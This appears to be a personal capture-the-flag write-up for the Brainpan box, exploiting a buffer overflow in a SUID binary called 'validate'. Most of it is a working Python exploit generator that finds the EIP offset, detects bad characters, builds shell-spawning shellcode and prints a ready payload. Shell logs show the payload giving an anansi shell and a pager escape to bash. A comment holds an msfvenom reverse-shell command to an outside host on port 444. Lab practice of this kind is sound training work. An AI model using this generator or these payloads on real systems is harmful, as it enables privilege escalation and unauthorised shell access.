
As this is a command line executable that just takes the input argument and the execution is finished in no time at all there's no way to attach to it. It's also not suitable to use a graphical debugger. Let's go for r2.

We use pwntools cyclic() to generate a non repetitive string:
`aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab`

We run r2.
```sh
┌──(kali㉿kali)-[~/bof]
└─$ r2 -d -A validate aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: glibc.fc_offset = 0x00148
...
[0xf7f99be0]> dc
[+] SIGNAL 11 errno=0 addr=0x62616165 code=1 si_pid=1650549093 ret=0
[0x62616165]> 
```

EIP ends up at 0x62616165

We used pwn cyclic-find() to get the position of this in the string: 116

This is the position where we will


Making script - not finished
```python
#!/usr/bin/env python3
#2025-01-31

#***IMPORTANT***
#For this to work you need to turn off ASLR on the machine where it's run
#sudo su
#echo 0 > /proc/sys/kernel/randomize_va_space
#exit
#cat /proc/sys/kernel/randomize_va_space
#The last command should return 0
#TODO! Add a check for the above to the script

from pwn import *
import subprocess
import os

context.log_level = 'critical'
context.delete_corefiles = True

executable = "./validate"
suid_user_id = 1001 #the user that owns the suid binary
initial_bad_chars = "\x00F" #initial bad chars, null and possible characters from reading the programs code

fuzz_step = 10

#-----------------------------------------------------------------------------------
#Prevent that appears when exiting when using context.delete_corefiles = True
_original_unlink = os.unlink
def safe_unlink(path, *args, **kwargs):
    if path.startswith("core."):  # Only ignore core dump deletions
        try:
            _original_unlink(path, *args, **kwargs)
        except FileNotFoundError:
            pass
    else:
        _original_unlink(path, *args, **kwargs)
os.unlink = safe_unlink

#-----------------------------------------------------------------------------------
e = ELF(executable)
context.binary = e
address_length = context.bits//8

r2_path = "/usr/bin/r2"
r2_arguments = "-d"

#-----------------------------------------------------------------------------------
print("\nRunning executable with increasing size arguments")
length = 0
while True:
  #print(".",end="")
  length += fuzz_step
  p = subprocess.run([executable, "A"*length])
  if not p.returncode == 0:
    print("Program crashed at "+str(length))
    crash_length = length
    break

#-----------------------------------------------------------------------------------
print("\nGenerating non repeating string")
cyclic_string = cyclic(crash_length)
print(cyclic_string)

#-----------------------------------------------------------------------------------
print("\nRunning executable in r2 with the generated string")
p = process([r2_path, r2_arguments, executable, cyclic_string])

p.sendline(b'dc\n') #put the command to start running the program in the buffer
while True:
  received_line = p.recvlineS().strip()
  if 'SIGNAL 11' in received_line:
    print("Buffer overflow: "+received_line)
    pos = received_line.find("addr=")
    crash_address_string = int(received_line[pos+5:][:10],0)
    print("Crash address string: %#x" % crash_address_string)
    break
p.sendline(b'q\n') #quitting r2

#-----------------------------------------------------------------------------------
print("\nFinding eip position using r2 output of crash address")
space_before_eip = cyclic_find(crash_address_string)
print("EIP position: "+str(space_before_eip))

#-----------------------------------------------------------------------------------
print("\nConfirming EIP position")

argument = b'a'*space_before_eip+b"B"*address_length
p = process([r2_path, r2_arguments, executable, argument])

p.sendline(b'dc\n') #put the command to start running the program in the buffer
while True:
  received_line = p.recvlineS().strip()
  if 'SIGNAL 11' in received_line:
    pos = received_line.find("addr=")
    crash_address_string = received_line[pos+5:][:10]
    print("Crash address string: "+crash_address_string)
    break
p.sendline(b'q\n') #quitting r2
if crash_address_string == "0x42424242":
  print("Confirmed!")
else:
  print("Failed! Exiting script! Please check the code.")
  exit()

#-----------------------------------------------------------------------------------
print("\nGenerating shellcode for a SUID binary - for user id "+str(suid_user_id))
shellcode_assempler_code = shellcraft.i386.linux.setreuid(str(suid_user_id))+shellcraft.i386.linux.sh()
#print(shellcode_assempler_code) # outputs assembler code
shellcode = asm(shellcode_assempler_code) # generates machine code in bytes format
print("Shellcode: "+(''.join(f'\\x{byte:02x}' for byte in shellcode)))
print("Shellcode length: "+str(len(shellcode))+" bytes")

#-----------------------------------------------------------------------------------
print("\nTesting for bad characters")
all_chars = "".join([chr(i) for i in range(256)])  # Generate all characters from \x00 to \xff
bad_chars = initial_bad_chars

found_all_bad_chars = False
while not found_all_bad_chars:
  chars_to_check = bytes("".join(c for c in all_chars if c not in bad_chars), "latin-1") # Remove bad_chars from all_chars and convert to bytes
  argument = b'A'*space_before_eip+b"B"*address_length+chars_to_check

  p = process([executable, argument]) #run the program with the argument
  p.wait() #wait until the program crashes

  stack_data_eax = p.corefile.read(p.corefile.eax, len(argument))
  print("stack_data_eax:")
  #print(''.join(f'\\x{byte:02x}' for byte in stack_data_eax))
  print("\\x"+stack_data_eax.hex(" ").replace(" ","\\x"))

  #from the coredump, get the data from the sp (stack pointer) for length of chars_to_check characters
  stack_data = p.corefile.read(p.corefile.sp, len(chars_to_check))
  print("stack_data:")
  print(stack_data)

  for i in range(len(chars_to_check)):
    #print("index: "+str(i)+", string: "+str(chars_to_check[i])+", stack: "+str(stack_data[i]))
    if not chars_to_check[i] == stack_data[i]: # Compare expected vs. actual data
      print("New bad character: %#x" % chars_to_check[i])
      bad_chars += chr(chars_to_check[i])
      print("Current bad character list: "+(''.join(f'\\x{byte:02x}' for byte in bytes(bad_chars,"latin-1"))))
      break
    if i == len(chars_to_check)-1:
      print("Just checked the last char and it was ok")
      found_all_bad_chars = True

#We could replace this bad chars test with one that replaces the first 'A'
#with one character at a time that we want to test - If it doesn't bof or if
#the character is not in the bof crash corefile, then we have a bad character

print("Bad chars: "+(''.join(f'\\x{byte:02x}' for byte in bytes(bad_chars,"latin-1"))))

#-----------------------------------------------------------------------------------
print("\nEncoding shellcode to avoid bad characters")
encoded_shellcode = encode(shellcode, avoid=bytes(bad_chars,"latin-1"))

print("Encoded shellcode: "+(''.join(f'\\x{byte:02x}' for byte in encoded_shellcode)))
print("New shellcode length: "+str(len(encoded_shellcode))+" bytes")
encoded_shellcode = (''.join(f'\\x{byte:02x}' for byte in encoded_shellcode))

#-----------------------------------------------------------------------------------
print("\nLooking for useful jmp and call instructions")
registers = ["esp", "eax"]
instructions = ["jmp ^", "call ^", "push ^; ret"]
found_address = False

jmp_address = next(e.search(asm("call eax")))

for register in registers:
  for instruction in instructions:
    search_thingy = instruction.replace("^",register)
    try:
      jmp_address = next(e.search(asm(search_thingy)))
    except StopIteration as e:
      print("'"+search_thingy+"' not found")
    else: #try finished without failing
      found_address = True
      break
    finally:
      e = ELF(executable)
  if found_address: break

if found_address:
  print(f"'{search_thingy}' found at: {hex(jmp_address)}")
  stack_data_jpm_code = p.corefile.read(jmp_address-4, 8)
  print(disasm(stack_data_jpm_code))
  address = jmp_address.to_bytes(address_length, "little") #Convert int to little-endian

else:
  print("Falling back to sp")
  #if none of these work = just put p.corefile.sp as the address
  #needs to be using 32 or 64 bits depending or ^
  print("\nSP address: "+hex(p.corefile.sp))
  address = int(p.corefile.sp).to_bytes(address_length, "little")

address = ''.join(f'\\x{byte:02x}' for byte in address)

print("\nAddress to put in EIP: "+address)

#-----------------------------------------------------------------------------------
print("\nGenerating the full payload")

def generate_shellcode_msfvenom():
  #msfvenom --payload 'linux/x86/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=444 --format 'python' --bad-chars '\x00\x0a'
  #msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x46' -e x86/shikata_ga_nai -f raw 2> /dev/null
  command = "msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x46' -e x86/shikata_ga_nai -f raw 2> /dev/null"
  command = command.split(" ")
  #print(command)
  print("Running msfvenom - This will take a few seconds")
  p = process(['msfvenom', '-a', 'x86', '-p', 'linux/x86/exec', 'CMD=/bin/sh', '-b', "'\\x00F'", '-e', 'x86/shikata_ga_nai', '-f', 'raw'],stderr=open("/dev/null", "wb"))
  received_data = p.recvall()
  print("data: "+str(len(received_data)))
  return received_data

payload = executable+" $(python -c \"print("

if found_address and register == "esp":
  #shellcode need to start after eip position
  fill_to_eip = "'A'*"+str(space_before_eip)
  payload += fill_to_eip + "+'" + address+ "'+'" + encoded_shellcode + "'"

elif register == "eax" and space_before_eip-len(encoded_shellcode) >= 0:
  #shellcode need to start at the start of the string
  fill_to_eip = "'A'*"+str(space_before_eip-len(encoded_shellcode))
  payload += "'" + encoded_shellcode + "'+" + fill_to_eip + "+'" + address+"'"

elif register == "eax" and space_before_eip-len(encoded_shellcode) < 0:
  encoded_shellcode = generate_shellcode_msfvenom()
  if space_before_eip-len(encoded_shellcode) < 0:
    print("space_before_eip-len(encoded_shellcode) < 0 - The shellcode won't fit!")
    exit()
  fill_to_eip = "'A'*"+str(space_before_eip-len(encoded_shellcode))
  encoded_shellcode = ''.join(f'\\x{byte:02x}' for byte in encoded_shellcode)
  payload += "'" + encoded_shellcode +"'+"+ fill_to_eip + "+'" + address+"'"

else:
  payload += "'A'*"+str(space_before_eip)+"+'"+address+"'+'"+encoded_shellcode+"'"

payload += ")\")"

print(payload)

try:
  p.close()
except:
  pass
```

Script output
```sh
┌──(kali㉿kali)-[~/bof]
└─$ ./bof-linux-suid-exploit-generator.py

Running executable with increasing size arguments
validating input...passed.
validating input...passed.
validating input...passed.
validating input...passed.
validating input...passed.
validating input...passed.
validating input...passed.
validating input...passed.
validating input...passed.
validating input...passed.
validating input...passed.
Program crashed at 120

Generating non repeating string
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab'

Running executable in r2 with the generated string
Buffer overflow: [+] SIGNAL 11 errno=0 addr=0x62616165 code=1 si_pid=1650549093 ret=0
Crash address string: 0x62616165

Finding eip position using r2 output of crash address
EIP position: 116

Confirming EIP position
Crash address string: 0x42424242
Confirmed!

Generating shellcode for a SUID binary - for user id 1001
Shellcode: \x31\xdb\x66\xbb\xe9\x03\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80
Shellcode length: 57 bytes

Testing for bad characters
stack_data_eax:
\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
stack_data:
b'\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
Just checked the last char and it was ok
Bad chars: \x00\x46

Encoding shellcode to avoid bad characters
Encoded shellcode: \xd9\xd0\xd9\x74\x24\xf4\x5e\xfc\x6a\x0f\x59\x83\xc6\x19\x89\xf7\xad\x93\xad\x31\xd8\xab\x49\x75\xf7\x01\x01\x01\x01\x30\xda\x67\xba\x01\x01\x01\x01\xe8\x02\x6b\x47\x01\x01\x01\x01\x59\x88\xd8\xcc\x01\x01\x01\x01\x81\x6b\x69\x69\x01\x01\x01\x01\x2e\x2e\x2e\x72\x01\x01\x01\x01\x69\x2e\x63\x68\x01\x01\x01\x01\x6f\x88\xe2\x69\x02\x02\x02\x02\x03\x03\x03\x03\x01\x01\x01\x01\x80\x35\x25\x73\x01\x02\x02\x01\x68\x03\x03\x30\x01\x01\x01\x01\xc8\x50\x6b\x05\x01\x02\x01\x01\x58\x03\xe0\x50\x01\x01\x01\x01\x88\xe0\x30\xd3\x01\x01\x01\x01\x6b\x0a\x59\xcc\x01\x01\x01\x01\x81\x01\x01\x01
New shellcode length: 145 bytes

Looking for useful jmp and call instructions
'jmp esp' not found
'call esp' not found
'push esp; ret' not found
'jmp eax' not found
'call eax' found at: 0x80484af
   0:   1c 9f                   sbb    al, 0x9f
   2:   04 08                   add    al, 0x8
   4:   ff d0                   call   eax
   6:   c9                      leave
   7:   c3                      ret

Address to put in EIP: \xaf\x84\x04\x08

Generating the full payload
Running msfvenom - This will take a few seconds
data: 70
./validate $(python -c "print('\xd9\xc0\xbf\xef\x8d\xf2\xb8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x0b\x31\x7e\x1a\x03\x7e\x1a\x83\xc6\x04\xe2\x1a\xe7\xf9\xe0\x7d\xaa\x9b\x78\x50\x28\xed\x9e\xc2\x81\x9e\x08\x12\xb6\x4f\xab\x7b\x28\x19\xc8\x29\x5c\x11\x0f\xcd\x9c\x0d\x6d\xa4\xf2\x7e\x02\x5e\x0b\xd6\xb7\x17\xea\x15\xb7'+'A'*46+'\xaf\x84\x04\x08')")
```

Running the payload:
```sh
puck@brainpan:/home/puck$ /usr/local/bin/validate $(python -c "print('\xda\xc7\xd9\x74\x24\xf4\x5a\xbd\xb8\xd8\xdd\xb1\x31\xc9\xb1\x0b\x31\x6a\x1a\x83\xc2\x04\x03\x6a\x16\xe2\x4d\xb2\xd6\xe9\x34\x11\x8f\x61\x6b\xf5\xc6\x95\x1b\xd6\xab\x31\xdb\x40\x63\xa0\xb2\xfe\xf2\xc7\x16\x17\x0c\x08\x96\xe7\x22\x6a\xff\x89\x13\x19\x97\x55\x3b\x8e\xee\xb7\x0e\xb0'+'A'*46+'\xaf\x84\x04\x08')")
97\x55\x3b\x8e\xee\xb7\x0e\xb0'+'A'*46+'\xaf\x84\x04\x08')")6a\xff\x89\x13\x19\x 
$ id
id
uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
$ 
```


Compare to

Working example from https://d7x.promiselabs.net/2018/03/07/ctf-brainpan-1-ctf-walkthrough-introduction-to-exploit-development-part-2/ - only works on the box, not on my machine:
```sh
┌──(kali㉿kali)-[~/bof]
└─$ ./validate $(python -c "print('\xba\xf1\x5c\x77\x54\xd9\xc5\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x0b\x31\x50\x15\x03\x50\x15\x83\xe8\xfc\xe2\x04\x36\x7c\x0c\x7f\x95\xe4\xc4\x52\x79\x60\xf3\xc4\x52\x01\x94\x14\xc5\xca\x06\x7d\x7b\x9c\x24\x2f\x6b\x96\xaa\xcf\x6b\x88\xc8\xa6\x05\xf9\x7f\x50\xda\x52\xd3\x29\x3b\x91\x53'+'\x90'*(116-70)+'\xaf\x84\x04\x08')")
```



```sh
id
uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
$ ls -la
ls -la
ls: cannot open directory .: Permission denied
$ cd ~
cd ~
/bin/sh: 3: cd: can't cd to ~
$ cd /home
cd /home
$ ls
ls
anansi  puck  reynard
$ cd anasi
cd anasi
/bin/sh: 6: cd: can't cd to anasi
$ cd anansi
cd anansi
$ ls -la
ls -la
total 32
drwx------ 4 anansi anansi 4096 Mar  4  2013 .
drwxr-xr-x 5 root   root   4096 Mar  4  2013 ..
-rw------- 1 anansi anansi    0 Mar  5  2013 .bash_history
-rw-r--r-- 1 anansi anansi  220 Mar  4  2013 .bash_logout
-rw-r--r-- 1 anansi anansi 3637 Mar  4  2013 .bashrc
drwx------ 2 anansi anansi 4096 Mar  4  2013 .cache
-rw------- 1 root   root     39 Mar  4  2013 .lesshst
-rw-r--r-- 1 anansi anansi  675 Mar  4  2013 .profile
drwxrwxr-x 2 anansi anansi 4096 Mar  5  2013 bin
$ cd bin
cd bin
$ ls -la
ls -la
total 16
drwxrwxr-x 2 anansi anansi 4096 Mar  5  2013 .
drwx------ 4 anansi anansi 4096 Mar  4  2013 ..
-rwxr-xr-x 1 anansi anansi 7256 Mar  4  2013 anansi_util
$ anansi_util
anansi_util
/bin/sh: 11: anansi_util: not found
$ ./anansi_util
./anansi_util
Usage: ./anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
$ ./anansi_util manual
./anansi_util manual
No manual entry for manual
$ ./anansi_util manual cat
./anansi_util manual cat
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)
CAT(1)                           User Commands                          CAT(1)

NAME
       cat - concatenate files and print on the standard output

SYNOPSIS
       cat [OPTION]... [FILE]...

DESCRIPTION
       Concatenate FILE(s), or standard input, to standard output.

       -A, --show-all
              equivalent to -vET

       -b, --number-nonblank
              number nonempty output lines, overrides -n

       -e     equivalent to -vE

       -E, --show-ends
              display $ at end of each line

       -n, --number
 Manual page cat(1) line 1 (press h for help or q to quit)!/bin/bash
!/bin/bash
puck@brainpan:/usr/share/man$ id
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
puck@brainpan:/usr/share/man$ exit
exit
exit
!done  (press RETURN)

...skipping...
CAT(1)                           User Commands                          CAT(1)

NAME
       cat - concatenate files and print on the standard output

SYNOPSIS
       cat [OPTION]... [FILE]...

DESCRIPTION
       Concatenate FILE(s), or standard input, to standard output.

       -A, --show-all
              equivalent to -vET

       -b, --number-nonblank
              number nonempty output lines, overrides -n

       -e     equivalent to -vE

       -E, --show-ends
              display $ at end of each line

       -n, --number
 Manual page cat(1) line 1 (press h for help or q to quit)q
$ 

```

Send this when we got the connect on 444
```sh
/usr/local/bin/validate $(python -c "print('\xd9\xc0\xbf\xef\x8d\xf2\xb8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x0b\x31\x7e\x1a\x03\x7e\x1a\x83\xc6\x04\xe2\x1a\xe7\xf9\xe0\x7d\xaa\x9b\x78\x50\x28\xed\x9e\xc2\x81\x9e\x08\x12\xb6\x4f\xab\x7b\x28\x19\xc8\x29\x5c\x11\x0f\xcd\x9c\x0d\x6d\xa4\xf2\x7e\x02\x5e\x0b\xd6\xb7\x17\xea\x15\xb7'+'A'*46+'\xaf\x84\x04\x08')")
id
python3 -c 'import pty;pty.spawn("/bin/bash")'
```